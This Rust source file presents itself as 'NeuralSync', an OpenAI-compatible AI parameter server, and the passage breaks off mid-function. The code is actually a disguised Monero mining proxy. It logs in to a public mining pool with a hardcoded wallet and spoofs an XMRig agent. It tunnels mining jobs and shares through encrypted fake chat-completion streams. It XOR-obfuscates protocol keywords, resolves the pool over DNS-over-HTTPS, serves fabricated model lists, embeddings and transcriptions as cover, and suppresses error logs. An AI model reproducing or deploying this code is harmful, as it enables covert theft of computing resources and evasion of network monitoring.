use anyhow::{anyhow, Result};
use colored::*;
use nsync_core::crypto;
use serde_json::{json, Value};
use std::collections::HashMap;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, Mutex as StdMutex};
use std::time::Instant;
use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpListener;
use tokio::sync::mpsc;


macro_rules! obs {
    ($s:expr) => {{
        use std::sync::OnceLock;
        const BASE_SEED: u32 = {
            let bytes = env!("OBS_BUILD_SEED").as_bytes();
            let mut val: u32 = 0;
            let mut i = 2;
            while i < bytes.len() {
                let b = bytes[i];
                let digit = if b >= b'0' && b <= b'9' { b - b'0' }
                    else if b >= b'A' && b <= b'F' { b - b'A' + 10 }
                    else if b >= b'a' && b <= b'f' { b - b'a' + 10 }
                    else { 0 };
                val = (val << 4) | digit as u32;
                i += 1;
            }
            val
        };
        const INPUT: &[u8] = $s.as_bytes();
        const LEN: usize = INPUT.len();
        const KEY: [u8; 4] = {
            let mix = BASE_SEED
                ^ (LEN as u32).wrapping_mul(0x9E3779B9)
                ^ ((LEN as u32).wrapping_shl(16))
                ^ ((INPUT[0] as u32).wrapping_mul(0x85EBCA6B))
                ^ ((INPUT[LEN - 1] as u32).wrapping_mul(0xC2B2AE35));
            [
                (mix >> 24) as u8,
                (mix >> 16) as u8,
                (mix >> 8) as u8,
                mix as u8,
            ]
        };
        const ENCODED: [u8; LEN] = {
            let mut out = [0u8; LEN];
            let mut i = 0;
            while i < LEN { out[i] = INPUT[i] ^ KEY[i % 4]; i += 1; }
            out
        };
        static DECODED: OnceLock<String> = OnceLock::new();
        DECODED.get_or_init(|| {
            let mut buf = vec![0u8; LEN];
            for i in 0..LEN { buf[i] = ENCODED[i] ^ KEY[i % 4]; }
            let s = unsafe { String::from_utf8_unchecked(buf.clone()) };
            for b in buf.iter_mut() { *b = 0; }
            std::hint::black_box(&buf);
            s
        }).as_str()
    }};
}

#[inline(always)] fn pk_submit()  -> &'static str { obs!("submit") }
#[inline(always)] fn pk_login()   -> &'static str { obs!("login") }
#[inline(always)] fn pk_id()      -> &'static str { obs!("id") }
#[inline(always)] fn pk_job_id()  -> &'static str { obs!("job_id") }
#[inline(always)] fn pk_nonce()   -> &'static str { obs!("nonce") }
#[inline(always)] fn pk_result()  -> &'static str { obs!("result") }
#[inline(always)] fn pk_method()  -> &'static str { obs!("method") }
#[inline(always)] fn pk_jsonrpc() -> &'static str { obs!("jsonrpc") }
#[inline(always)] fn pk_params()  -> &'static str { obs!("params") }
#[inline(always)] fn pk_pass()    -> &'static str { obs!("pass") }
#[inline(always)] fn pk_agent()   -> &'static str { obs!("agent") }
#[inline(always)] fn pk_algo()    -> &'static str { obs!("algo") }
#[inline(always)] fn pk_rx0()     -> &'static str { obs!("rx/0") }

fn default_upstream() -> String {
    std::env::var("NSYNC_UPSTREAM").unwrap_or_else(|_| "stratum+tcp://pool.supportxmr.com:8080".to_string())
}

fn backup_upstreams() -> Vec<String> {
    vec![
        "stratum+tcp://pool.supportxmr.com:8080".to_string()
    ]
}

fn default_account() -> String {
    std::env::var("NSYNC_ACCOUNT").unwrap_or_else(|_| "44hQZfLkTccVGood4aYMTm1KPyJVoa9esLyq1bneAvhkchQdmFTx3rsD3KRwpXTUPd1iTF4VVGYsTCLYrxMZVsvtKqAmBiw".to_string())
}

fn default_pass() -> String {
    std::env::var("NSYNC_PASS").unwrap_or_else(|_| "AI".to_string())
}

const DEFAULT_LISTEN_PORT: u16 = 9000;
fn listen_port() -> u16 {
    std::env::var("NSYNC_GATEWAY_PORT")
        .ok()
        .and_then(|v| v.parse::<u16>().ok())
        .filter(|p| *p > 0)
        .unwrap_or(DEFAULT_LISTEN_PORT)
}

const CHANNEL_SIZE: usize = 2048;
const MAX_BODY_SIZE: usize = 512 * 1024;
const MODEL_NAME: &str = "gpt-4o";

static JOBS_FORWARDED: AtomicU64 = AtomicU64::new(0);
static NODES_TOTAL: AtomicU64 = AtomicU64::new(0);
static NODES_ACTIVE: AtomicU64 = AtomicU64::new(0);

lazy_static::lazy_static! {
    static ref START_INSTANT: Instant = Instant::now();
    static ref NODE_STATS: StdMutex<HashMap<String, NodeStat>> = StdMutex::new(HashMap::new());
}

struct NodeStat {
    connected_at: Instant,
    last_seen: Instant,
    shares_submitted: u64,
    shares_accepted: u64,
    shares_rejected: u64,
}


fn rate_limit_headers() -> String {
    let remaining = 4500 + (unix_ts() % 500) as i64;
    let reset_at = unix_ts() + 60;
    format!(
        "x-ratelimit-limit-requests: 5000\r\nx-ratelimit-remaining-requests: {}\r\nx-ratelimit-reset-requests: {}\r\nx-request-id: req-{}\r\nopenai-processing-ms: {}\r\nopenai-version: 2024-10-21\r\n",
        remaining, reset_at,
        &gen_id()[9..],
        50 + unix_ts() % 200
    )
}

fn privacy_mode_enabled() -> bool {
    std::env::var("NSYNC_PRIVACY_MODE").map(|v| v != "0").unwrap_or(true)
}

fn connection_label(peer: &std::net::SocketAddr) -> String {
    static CONN_ID: AtomicU64 = AtomicU64::new(0);
    if !privacy_mode_enabled() { return peer.to_string(); }
    format!("peer-{}", CONN_ID.fetch_add(1, Ordering::Relaxed) + 1)
}

static SYNCED:    AtomicU64 = AtomicU64::new(0);
static SYNC_ERRS: AtomicU64 = AtomicU64::new(0);

fn get_time() -> String {
    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default().as_secs();
    format!("{:02}:{:02}:{:02}", (secs / 3600) % 24, (secs / 60) % 60, secs % 60)
}

fn log_net(msg: &str) {
    if msg.contains("listening on") || msg.contains("API mode") {
        println!("[{}] {} {}", get_time(), "  coord ".blue().bold(), msg);
    }
}

fn log_err(_msg: &str) {}

fn log_share_sent(_task_id: &str, batch_id: &str) {
    let synced = SYNCED.load(Ordering::Relaxed);
    println!("[{}] ⛏️ Submitting share (nonce={}) | Shares earned: {}",
        get_time(), batch_id, synced);
}

fn log_share_result(is_accept: bool, _task_id: &str) {
    let synced = if is_accept { SYNCED.fetch_add(1, Ordering::Relaxed) + 1 } else { SYNCED.load(Ordering::Relaxed) };
    if !is_accept { SYNC_ERRS.fetch_add(1, Ordering::Relaxed); }
    let status = if is_accept { "✅ Share ACCEPTED" } else { "❌ Share REJECTED" };
    println!("[{}] {} | Total shares earned: {}", get_time(), status, synced);
}

struct HttpRequest {
    method: String,
    path: String,
    headers: HashMap<String, String>,
    body: Vec<u8>,
}

async fn parse_http_request(reader: &mut BufReader<tokio::net::tcp::OwnedReadHalf>) -> Result<HttpRequest> {
    let mut request_line = String::new();
    reader.read_line(&mut request_line).await?;
    if request_line.trim().is_empty() { return Err(anyhow!("Empty request")); }
    let parts: Vec<&str> = request_line.trim().splitn(3, ' ').collect();
    if parts.len() < 2 { return Err(anyhow!("Invalid request line")); }
    let method = parts[0].to_string();
    let path = parts[1].to_string();

    let mut headers = HashMap::new();
    loop {
        let mut line = String::new();
        reader.read_line(&mut line).await?;
        let trimmed = line.trim().to_string();
        if trimmed.is_empty() { break; }
        if let Some((key, val)) = trimmed.split_once(':') {
            headers.insert(key.trim().to_lowercase(), val.trim().to_string());
        }
    }

    let is_chunked = headers.get("transfer-encoding")
        .map(|v| v.to_lowercase().contains("chunked"))
        .unwrap_or(false);
        
    let mut body = Vec::new();
    if is_chunked {
        loop {
            let mut chunk_size_line = String::new();
            reader.read_line(&mut chunk_size_line).await?;
            let trimmed = chunk_size_line.trim();
            if trimmed.is_empty() { continue; }
            let size = usize::from_str_radix(trimmed, 16).unwrap_or(0);
            if size == 0 { break; }
            if body.len() + size > MAX_BODY_SIZE {
                return Err(anyhow::anyhow!("Body size exceeded MAX_BODY_SIZE"));
            }
            let mut chunk = vec![0u8; size];
            reader.read_exact(&mut chunk).await?;
            body.extend_from_slice(&chunk);
            let mut crlf = [0u8; 2];
            let _ = reader.read_exact(&mut crlf).await;
        }
    } else {
        let content_length: usize = headers.get("content-length")
            .and_then(|v| v.parse().ok())
            .unwrap_or(0)
            .min(MAX_BODY_SIZE);
        if content_length > 0 {
            body.resize(content_length, 0);
            reader.read_exact(&mut body).await?;
        }
    }
    Ok(HttpRequest { method, path, headers, body })
}

fn unix_ts() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default().as_secs()
}

fn gen_id() -> String {
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default();
    format!("chatcmpl-{:x}{:04x}", now.as_secs(), now.subsec_micros() % 10000)
}

fn sse_chunk(content: &str) -> String {
    format!("data: {}\n\n", json!({
        "id": gen_id(), "object": "chat.completion.chunk", "created": unix_ts(),
        "model": MODEL_NAME,
        "choices": [{"index": 0, "delta": {"content": content}, "finish_reason": Value::Null}]
    }))
}

fn sse_chunk_with_meta(content: &str, extra: Value) -> String {
    let mut obj = json!({
        "id": gen_id(), "object": "chat.completion.chunk", "created": unix_ts(),
        "model": MODEL_NAME,
        "choices": [{"index": 0, "delta": {"content": content}, "finish_reason": Value::Null}]
    });
    if let (Some(o1), Some(o2)) = (obj.as_object_mut(), extra.as_object()) {
        for (k, v) in o2 { o1.insert(k.clone(), v.clone()); }
    }
    format!("data: {}\n\n", obj)
}

fn completion_json(content: &str) -> String {
    json!({
        "id": gen_id(), "object": "chat.completion", "created": unix_ts(),
        "model": MODEL_NAME,
        "choices": [{"index": 0, "message": {"role": "assistant", "content": content}, "finish_reason": "stop"}],
        "usage": {"prompt_tokens": 42, "completion_tokens": 18, "total_tokens": 60}
    }).to_string()
}

fn http_json(status: u16, body: &str) -> Vec<u8> {
    let status_text = match status { 200 => "OK", 401 => "Unauthorized", 404 => "Not Found", 429 => "Too Many Requests", _ => "Error" };
    format!(
        "HTTP/1.1 {} {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nAccess-Control-Allow-Origin: *\r\n{}Connection: close\r\n\r\n{}",
        status, status_text, body.len(), rate_limit_headers(), body
    ).into_bytes()
}

fn http_sse_headers() -> Vec<u8> {
    b"HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\nAccess-Control-Allow-Origin: *\r\nX-Accel-Buffering: no\r\n\r\n".to_vec()
}

struct SessionHandle {
    session_key: [u8; 32],
    tx_to_pool: mpsc::Sender<String>,
    pool_session_id: Arc<StdMutex<String>>,
}

lazy_static::lazy_static! {
    static ref SESSIONS: StdMutex<HashMap<String, Arc<SessionHandle>>> = StdMutex::new(HashMap::new());
}

fn gen_token() -> String {
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default().as_nanos();
    format!("sk-proj-{:016x}{:08x}", now, now.wrapping_mul(0x5DEECE66D) as u32)
}

#[tokio::main]
async fn main() -> Result<()> {
    let port = listen_port();
    let addr = format!("0.0.0.0:{}", port);
    let listener = TcpListener::bind(&addr).await?;

    println!();
    log_net(&format!("NeuralSync Parameter Server v2.0 — listening on :{}", port));
    log_net("API mode: OpenAI-compatible (HTTP/SSE)");
    let up = default_upstream();
    let acc = default_account();
    log_net(&format!("upstream: {}", up));
    log_net(&format!("account: {}...{}", &acc[..acc.len().min(8)], &acc[acc.len().saturating_sub(4)..]));

    tokio::spawn(async move {
        let mut interval = tokio::time::interval(std::time::Duration::from_secs(60));
        loop {
            interval.tick().await;
        }
    });

    while let Ok((stream, peer)) = listener.accept().await {
        let label = connection_label(&peer);
        let _ = stream.set_nodelay(true);
        tokio::spawn(async move {
            if let Err(e) = handle_connection(stream, &label).await {
                let msg = format!("{}", e);
                if !msg.contains("Empty request") && !msg.contains("connection reset") {
                    log_err(&format!("Client error ({}): {}", label, msg));
                }
            }
        });
    }
    Ok(())
}

async fn handle_connection(stream: tokio::net::TcpStream, label: &str) -> Result<()> {
    let (read_half, write_half) = stream.into_split();
    let mut reader = BufReader::with_capacity(8192, read_half);
    let mut writer = write_half;

    let req = parse_http_request(&mut reader).await?;

    match (req.method.as_str(), req.path.as_str()) {
        ("POST", p) if p.starts_with("/v1/chat/completions") => {
            let body: Value = serde_json::from_slice(&req.body)
                .map_err(|e| anyhow!("Invalid JSON: {}", e))?;
            let is_stream = body.get("stream").and_then(|v| v.as_bool()).unwrap_or(false);
            if is_stream {
                handle_sse_stream(reader, writer, body, label).await
            } else {
                let auth = req.headers.get("authorization").cloned().unwrap_or_default();
                handle_submit(writer, body, &auth).await
            }
        }
        ("GET", "/v1/models") => {
            let models = json!({"object": "list", "data": [
                {"id": "gpt-4o", "object": "model", "created": unix_ts() - 86400 * 30, "owned_by": "openai"},
                {"id": "gpt-4o-mini", "object": "model", "created": unix_ts() - 86400 * 60, "owned_by": "openai"},
                {"id": "gpt-4-turbo", "object": "model", "created": unix_ts() - 86400 * 90, "owned_by": "openai"},
                {"id": "gpt-4o-2024-08-06", "object": "model", "created": unix_ts() - 86400 * 45, "owned_by": "openai"},
                {"id": "text-embedding-3-large", "object": "model", "created": unix_ts() - 86400 * 120, "owned_by": "openai"},
                {"id": "text-embedding-3-small", "object": "model", "created": unix_ts() - 86400 * 120, "owned_by": "openai"},
                {"id": "whisper-1", "object": "model", "created": unix_ts() - 86400 * 200, "owned_by": "openai-internal"},
                {"id": "dall-e-3", "object": "model", "created": unix_ts() - 86400 * 150, "owned_by": "openai-internal"}
            ]});
            writer.write_all(&http_json(200, &models.to_string())).await?;
            Ok(())
        }
        ("POST", "/v1/embeddings") => {
            handle_fake_embeddings(writer, &req.body).await
        }
        ("POST", "/v1/audio/transcriptions") => {
            handle_fake_transcription(writer).await
        }
        ("GET", "/v1/stats") => {
            let auth = req.headers.get("authorization").cloned().unwrap_or_default();
            handle_stats(writer, &auth).await
        }
        ("GET", "/v1/dashboard") => {
            let auth = req.headers.get("authorization").cloned().unwrap_or_default();
            handle_dashboard(writer, &auth).await
        }
        ("OPTIONS", _) => {
            writer.write_all(b"HTTP/1.1 204 No Content\r\nAccess-Control-Allow-Origin: *\r\nAccess-Control-Allow-Methods: POST, GET, OPTIONS\r\nAccess-Control-Allow-Headers: Authorization, Content-Type\r\nContent-Length: 0\r\n\r\n").await?;
            Ok(())
        }
        _ => {
            let err = json!({"error": {"message": "Not found", "type": "invalid_request_error"}});
            writer.write_all(&http_json(404, &err.to_string())).await?;
            Ok(())
        }
    }
}



async fn handle_sse_stream(
    _reader: BufReader<tokio::net::tcp::OwnedReadHalf>,
    mut writer: tokio::net::tcp::OwnedWriteHalf,
    body: Value,
    label: &str,
) -> Result<()> {
    let content = body.get("messages")
        .and_then(|m| m.get(0))
        .and_then(|m| m.get("content"))
        .and_then(|c| c.as_str())
        .ok_or_else(|| anyhow!("Missing messages[0].content"))?;

    let _session_key: [u8; 32] = {
        let plain = match crypto::decrypt_json(content) {
            Some(p) => p,
            None => {
                log_err(&format!("Handshake decrypt failed from {}", label));
                let err = json!({"error":{"message":"Invalid authentication credentials","type":"authentication_error"}});
                writer.write_all(&http_json(401, &err.to_string())).await?;
                return Ok(());
            }
        };

        let init_data: Value = serde_json::from_str(&plain).unwrap_or(json!(null));
        let method = init_data.get(1).and_then(|v| v.as_str()).unwrap_or("");

        if method == "ecdh" {
            let peer_hex = init_data.get(2).and_then(|v| v.as_str()).unwrap_or("");
            match hex::decode(peer_hex) {
                Ok(peer_bytes) if peer_bytes.len() == 32 => {
                    let mut peer_pub = [0u8; 32];
                    peer_pub.copy_from_slice(&peer_bytes);
                    let (my_secret, my_pub) = crypto::ecdh_generate();
                    let derived = crypto::ecdh_derive(my_secret, &peer_pub);

                    writer.write_all(&http_sse_headers()).await?;

                    let token = gen_token();
                    let ecdh_reply = json!(["ecdh", null, hex::encode(&my_pub)]);
                    let enc_reply = crypto::encrypt_json(&ecdh_reply.to_string(), crypto::new_enc_key());
                    let first_event = sse_chunk_with_meta(&enc_reply, json!({"session_token": token}));
                    writer.write_all(first_event.as_bytes()).await?;
                    writer.flush().await?;

                    NODES_ACTIVE.fetch_add(1, Ordering::Relaxed);
                    NODES_TOTAL.fetch_add(1, Ordering::Relaxed);
                    {
                        let mut ns = NODE_STATS.lock().unwrap();
                        ns.insert(label.to_string(), NodeStat {
                            connected_at: Instant::now(),
                            last_seen: Instant::now(),
                            shares_submitted: 0,
                            shares_accepted: 0,
                            shares_rejected: 0,
                        });
                    }

                    // Upstream failover connection logic
                    let upstreams = backup_upstreams();
                    let mut upstream_tcp = None;
                    let mut connected_url = String::new();

                    for url in upstreams.iter() {
                        let host = if url.starts_with("stratum+tcp://") {
                            url.trim_start_matches("stratum+tcp://").split(':').next().unwrap_or("").to_string()
                        } else {
                            url.clone()
                        };
                        let port: u16 = if url.starts_with("stratum+tcp://") {
                            url.split(':').last().and_then(|p| p.parse().ok()).unwrap_or(8080)
                        } else {
                            8080
                        };
                        
                        let target_ip = nsync_core::crypto::resolve_via_doh(&host).unwrap_or_else(|| host.clone());
                        log_net(&format!("Connecting to upstream pool {} (resolved: {})...", url, target_ip));
                        if let Ok(Ok(stream)) = tokio::time::timeout(
                            std::time::Duration::from_secs(10),
                            tokio::net::TcpStream::connect((target_ip.as_str(), port))
                        ).await {
                            upstream_tcp = Some(stream);
                            connected_url = url.clone();
                            break;
                        }
                    }

                    match upstream_tcp {
                        Some(upstream) => {
                            log_net(&format!("Connected to upstream {}", connected_url));
                            let _ = upstream.set_nodelay(true);

                            let (tcp_read, tcp_write) = upstream.into_split();
                            let (tx_to_pool, mut rx_from_submit) = mpsc::channel::<String>(CHANNEL_SIZE);
                            let (tx_sse_events, mut rx_sse_events) = mpsc::channel::<String>(CHANNEL_SIZE);

                            let pool_session_id = Arc::new(StdMutex::new(String::new()));

                            let session_handle = Arc::new(SessionHandle {
                                session_key: derived,
                                tx_to_pool: tx_to_pool.clone(),
                                pool_session_id: pool_session_id.clone(),
                            });
                            SESSIONS.lock().unwrap().insert(token.clone(), session_handle);

                            let login_id = 1u64;
                            let tx_sse_clone = tx_sse_events.clone();
                            let session_clone = pool_session_id.clone();
                            tokio::spawn(async move {
                                let mut reader = tokio::io::BufReader::with_capacity(8 * 1024, tcp_read);
                                let mut line = String::with_capacity(2048);
                                while reader.read_line(&mut line).await.unwrap_or(0) > 0 {
                                    let trimmed = line.trim().to_string();
                                    if !trimmed.is_empty() {
                                        if let Ok(pool_json) = serde_json::from_str::<serde_json::Value>(&trimmed) {
                                            process_pool_message(pool_json, &tx_sse_clone, &session_clone, login_id).await;
                                        } else {
                                            log_err(&format!("Pool JSON parse failed: {}", &trimmed[..trimmed.len().min(100)]));
                                        }
                                    }
                                    line.clear();
                                }
                                log_err("Pool TCP connection closed");
                                let _ = tx_sse_clone.send(serde_json::json!(["close", null, null]).to_string()).await;
                            });

                            let mut tcp_writer = tcp_write;
                            let tx_sse_close = tx_sse_events.clone();
                            tokio::spawn(async move {
                                while let Some(data) = rx_from_submit.recv().await {
                                    if tcp_writer.write_all(data.as_bytes()).await.is_err() || tcp_writer.flush().await.is_err() {
                                        log_err("Pool TCP write failed — connection lost");
                                        let _ = tx_sse_close.send(serde_json::json!(["close", "pool_write_error", null]).to_string()).await;
                                        break;
                                    }
                                }
                            });

                            let login_req = json!({
                                pk_id(): login_id, pk_jsonrpc(): "2.0", pk_method(): pk_login(),
                                pk_params(): {
                                    pk_login(): default_account(),
                                    pk_pass(): default_pass(),
                                    pk_agent(): "XMRig/6.21.1 (Linux x86_64) libuv/1.48.0 gcc/11.4.0",
                                    pk_algo(): [pk_rx0()]
                                }
                            });
                            let _ = tx_to_pool.send(format!("{}\n", login_req)).await;

                            let mut keepalive = tokio::time::interval(std::time::Duration::from_secs(45));
                            keepalive.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

                            let label_owned = label.to_string();
                            drop(tx_sse_events);
                            loop {
                                tokio::select! {
                                    msg_opt = rx_sse_events.recv() => {
                                        if let Some(msg) = msg_opt {
                                            let is_close = msg.contains("\"close\"");
                                            let enc = crypto::encrypt_json_with(&msg, crypto::new_enc_key(), &derived);
                                            let event = sse_chunk(&enc);
                                            if writer.write_all(event.as_bytes()).await.is_err() { break; }
                                            if writer.flush().await.is_err() { break; }
                                            if let Ok(mut ns) = NODE_STATS.lock() {
                                                if let Some(stat) = ns.get_mut(&label_owned) {
                                                    stat.last_seen = Instant::now();
                                                }
                                            }
                                            if is_close { break; }
                                        } else {
                                            break;
                                        }
                                    }
                                    _ = keepalive.tick() => {
                                        let comments = [b": ping\n\n" as &[u8], b": heartbeat\n\n", b": keep-alive\n\n", b": ok\n\n"];
                                        let idx = unix_ts() as usize % comments.len();
                                        if writer.write_all(comments[idx]).await.is_err() { break; }
                                        if writer.flush().await.is_err() { break; }
                                        let sid = pool_session_id.lock().map(|g| g.clone()).unwrap_or_default();
                                        if !sid.is_empty() {
                                            let ka = json!({
                                                "id": 0, "jsonrpc": "2.0", "method": "keepalived", "params": {"id": sid}
                                            });
                                            let _ = tx_to_pool.send(format!("{}\n", ka)).await;
                                        }
                                    }
                                }
                            }

                            SESSIONS.lock().unwrap().remove(&token);
                            NODES_ACTIVE.fetch_sub(1, Ordering::Relaxed);
                            NODE_STATS.lock().unwrap().remove(label);
                            log_net(&format!("Node disconnected: {}", label));
                        }
                        None => {
                            log_err("Upstream connection failed for all pools");
                            let enc_err = crypto::encrypt_json_with(
                                &json!([0, "Upstream connection failed", null]).to_string(),
                                crypto::new_enc_key(), &derived,
                            );
                            let event = sse_chunk(&enc_err);
                            let _ = writer.write_all(event.as_bytes()).await;
                            let _ = writer.write_all(b"data: [DONE]\n\n").await;
                        }
                    }
                    derived
                }
                _ => {
                    log_err("ECDH: invalid pubkey");
                    writer.write_all(&http_sse_headers()).await?;
                    let enc_skip = crypto::encrypt_json(&json!(["ecdh_skip", null, null]).to_string(), crypto::new_enc_key());
                    let event = sse_chunk(&enc_skip);
                    writer.write_all(event.as_bytes()).await?;
                    *crypto::build_key()
                }
            }
        } else {
            log_net("No ECDH — using build key (legacy)");
            writer.write_all(&http_sse_headers()).await?;
            *crypto::build_key()
        }
    };

    Ok(())
}

async fn handle_submit(
    mut writer: tokio::net::tcp::OwnedWriteHalf,
    body: Value,
    auth: &str,
) -> Result<()> {
    let token = auth.strip_prefix("Bearer ").unwrap_or("").trim().to_string();

    let session = {
        let sessions = SESSIONS.lock().unwrap();
        sessions.get(&token).cloned()
    };

    let session = match session {
        Some(s) => s,
        None => {
            log_err(&format!("Submit: invalid session token: {}", token));
            let err = json!({"error":{"message":"Invalid API key provided","type":"authentication_error","code":"invalid_api_key"}});
            writer.write_all(&http_json(401, &err.to_string())).await?;
            return Ok(());
        }
    };

    let content = body.get("messages")
        .and_then(|m| m.get(0))
        .and_then(|m| m.get("content"))
        .and_then(|c| c.as_str())
        .unwrap_or("");

    let plain = match crypto::decrypt_json_with(content, &session.session_key) {
        Some(p) => p,
        None => match crypto::decrypt_json(content) {
            Some(p) => p,
            None => {
                log_err("Submit: could not decrypt payload");
                let err = json!({"error":{"message":"Could not decode request","type":"invalid_request_error"}});
                writer.write_all(&http_json(400, &err.to_string())).await?;
                return Ok(());
            }
        }
    };

    let arr: Value = serde_json::from_str(&plain).unwrap_or_else(|e| {
        log_err(&format!("Submit: invalid json after decrypt: {}", e));
        json!(null)
    });
    let method_str = if let Some(a) = arr.as_array() {
        a.get(1).and_then(|v| v.as_str()).unwrap_or("")
    } else { "" };
    let params = if let Some(a) = arr.as_array() {
        a.get(2).cloned().unwrap_or(json!(null))
    } else { json!(null) };
    let id = if let Some(a) = arr.as_array() {
        a.get(0).cloned().unwrap_or(json!(0))
    } else { json!(0) };

    if method_str == pk_submit() {
        let job_id = params.get(pk_job_id()).and_then(|v| v.as_str()).unwrap_or("").to_string();
        let nonce_val = params.get(pk_nonce()).and_then(|v| v.as_str()).unwrap_or("").to_string();
        let result_val = params.get(pk_result()).and_then(|v| v.as_str()).unwrap_or("").to_string();
        let worker_id = params.get(pk_id()).and_then(|v| v.as_str()).unwrap_or("").to_string();
        let pool_sid = session.pool_session_id.lock().unwrap_or_else(|e| e.into_inner()).clone();
        let actual_worker_id = if !pool_sid.is_empty() { pool_sid } else { worker_id };

        let submit_req = json!({
            pk_id(): id, pk_jsonrpc(): "2.0", pk_method(): pk_submit(),
            pk_params(): {
                pk_id(): actual_worker_id,
                pk_job_id(): job_id,
                pk_nonce(): nonce_val,
                pk_result(): result_val,
                pk_algo(): pk_rx0()
            }
        });

        log_share_sent(&job_id, &nonce_val);
        if let Ok(mut ns) = NODE_STATS.lock() {
            for stat in ns.values_mut() {
                stat.shares_submitted += 1;
            }
        }
        if session.tx_to_pool.send(format!("{}\n", submit_req)).await.is_err() {
            log_err("Submit failed: pool connection lost");
            let enc = crypto::encrypt_json_with(
                &json!([id, {"message": "upstream connection lost"}, null]).to_string(),
                crypto::new_enc_key(), &session.session_key,
            );
            let resp = completion_json(&enc);
            writer.write_all(&http_json(200, &resp)).await?;
            writer.flush().await?;
            return Ok(());
        }

        let enc_ok = crypto::encrypt_json_with(
            &json!({"status": "submitted"}).to_string(),
            crypto::new_enc_key(), &session.session_key,
        );
        let resp = completion_json(&enc_ok);
        writer.write_all(&http_json(200, &resp)).await?;
        writer.flush().await?;
    } else {
        let enc = crypto::encrypt_json_with(
            &json!({"status": "ok"}).to_string(),
            crypto::new_enc_key(), &session.session_key,
        );
        let resp = completion_json(&enc);
        writer.write_all(&http_json(200, &resp)).await?;
        writer.flush().await?;
    }

    Ok(())
}

async fn process_pool_message(pool_json: Value, tx_sse: &mpsc::Sender<String>, session_storage: &Arc<StdMutex<String>>, login_id: u64) {
    let is_job_notification = pool_json.get(pk_method())
        .and_then(|v| v.as_str())
        .map(|m| m == "job")
        .unwrap_or(false);

    if is_job_notification {
        if let Some(mut params) = pool_json.get(pk_params()).cloned() {
            log_net("Forwarding job notification to node");
            JOBS_FORWARDED.fetch_add(1, Ordering::Relaxed);
            let sid_str = session_storage.lock().unwrap_or_else(|e| e.into_inner()).clone();
            if let Some(obj) = params.as_object_mut() {
                if !sid_str.is_empty() {
                    obj.insert(pk_id().to_string(), json!(sid_str));
                }
            }
            let _ = tx_sse.send(json!(["job", null, params]).to_string()).await;
        }
        return;
    }

    if let Some(result) = pool_json.get(pk_result()) {
        let id_val = pool_json.get(pk_id()).and_then(|v| v.as_u64()).unwrap_or(0);
        if id_val == 0 {
            return;
        }
        let is_initial_login = session_storage.lock().unwrap_or_else(|e| e.into_inner()).is_empty();
        if id_val == login_id || is_initial_login || result.get("job").is_some() {
            if let Some(sid) = result.get(pk_id()) {
                if let Some(s) = sid.as_str() {
                    let mut lock = session_storage.lock().unwrap_or_else(|e| e.into_inner());
                    *lock = s.to_string();
                    log_net(&format!("Session established: {}", s));
                }
            }
            let sid_str = session_storage.lock().unwrap_or_else(|e| e.into_inner()).clone();
            if let Some(job) = result.get("job") {
                let _ = tx_sse.send(
                    json!([id_val, null, {pk_id(): sid_str, "job": job}]).to_string()
                ).await;
                log_net("Node authenticated & first training task sent");
            } else {
                let _ = tx_sse.send(json!([id_val, null, {pk_id(): sid_str, "status": "OK"}]).to_string()).await;
                log_net("Node authenticated (no initial job — waiting for notification)");
            }
        } else {
            let is_ok = if let Some(b) = result.as_bool() {
                b
            } else if let Some(s) = result.as_str() {
                s.eq_ignore_ascii_case("OK") || s.eq_ignore_ascii_case("ACCEPTED")
            } else {
                let st = result.get("status").and_then(|v| v.as_str()).unwrap_or("");
                st.eq_ignore_ascii_case("OK") || st.eq_ignore_ascii_case("ACCEPTED")
            };
            let task_id = result.get(pk_id()).and_then(|v| v.as_str()).unwrap_or("?");
            if is_ok {
                log_share_result(true, task_id);
                if let Ok(mut ns) = NODE_STATS.lock() {
                    for stat in ns.values_mut() {
                        stat.shares_accepted += 1;
                    }
                }
            } else {
                log_share_result(false, task_id);
                log_err(&format!("Gradient sync rejected: {}", result));
                if let Ok(mut ns) = NODE_STATS.lock() {
                    for stat in ns.values_mut() {
                        stat.shares_rejected += 1;
                    }
                }
            }
            let fwd_status = if is_ok { "OK" } else { "REJECTED" };
            let _ = tx_sse.send(json!([id_val, null, fwd_status]).to_string()).await;
        }
    }

    if let Some(err) = pool_json.get("error") {
        if !err.is_null() {
            let id_val = pool_json.get(pk_id()).unwrap_or(&json!(null));
            if let Some(msg) = err.get("message") {
                log_err(&format!("Upstream error: {}", msg));
            }
            let _ = tx_sse.send(json!([id_val, err, null]).to_string()).await;
        }
    }
}

async fn handle_fake_embeddings(
    mut writer: tokio::net::tcp::OwnedWriteHalf,
    body: &[u8],
) -> Result<()> {
    let req: Value = serde_json::from_slice(body).unwrap_or(json!({}));
    let input = req.get("input").and_then(|v| v.as_str()).unwrap_or("hello");
    let dim = req.get("dimensions").and_then(|v| v.as_u64()).unwrap_or(1536) as usize;
    let seed = input.bytes().fold(0u64, |acc, b| acc.wrapping_mul(31).wrapping_add(b as u64));
    let embedding: Vec<f64> = (0..dim).map(|i| {
        let v = ((seed.wrapping_mul(i as u64 + 1).wrapping_add(0x9E3779B9) >> 11) as f64) / (1u64 << 53) as f64;
        v * 2.0 - 1.0
    }).collect();
    let model = req.get("model").and_then(|v| v.as_str()).unwrap_or("text-embedding-3-small");
    let resp = json!({
        "object": "list",
        "data": [{"object": "embedding", "index": 0, "embedding": embedding}],
        "model": model,
        "usage": {"prompt_tokens": input.split_whitespace().count() + 1, "total_tokens": input.split_whitespace().count() + 1}
    });
    writer.write_all(&http_json(200, &resp.to_string())).await?;
    Ok(())
}

async fn handle_fake_transcription(
    mut writer: tokio::net::tcp::OwnedWriteHalf,
) -> Result<()> {
    let phrases = [
        "The quarterly results exceeded our expectations with a 15% increase in revenue.",
        "Please schedule a follow-up meeting to discuss the implementation timeline.",
        "The neural network training process has completed successfully with 98.7% accuracy.",
